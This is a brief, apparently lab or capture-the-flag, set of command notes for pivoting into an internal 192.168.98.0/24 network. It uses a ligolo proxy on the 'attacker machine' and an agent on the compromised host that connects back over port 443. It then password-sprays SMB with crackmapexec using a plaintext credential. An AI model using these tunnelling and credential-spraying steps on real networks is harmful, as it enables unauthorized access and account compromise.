



```
# Attacker Machine
   sudo ip tuntap add user <your_user> mode tun ligolo

#Delete the 192.168.98.0/24 IP Range from the tun0 interface:  
   sudo ip route del 192.168.98.0/24 dev tun0  

#Up the ligolo interface :  
    sudo ip link set ligolo up  

#Add 192.168.98.0/24 IP range to the ligolo interface:  
    sudo ip route add 192.168.98.0/24 dev ligolo
```


Confirm the route on your attacker machine. The internal IP range is now  
added in the route
` ip route `

Start the proxy on the attacker server
` ./proxy -selfcert -laddr 0.0.0.0:443  `

` ./agent -connect 10.10.200.X:443 -ignore-cert  `

```
#Now, use cme to spray the credentials :
crackmapexec --verbose smb target.txt -u john -p User1@#$%6
```
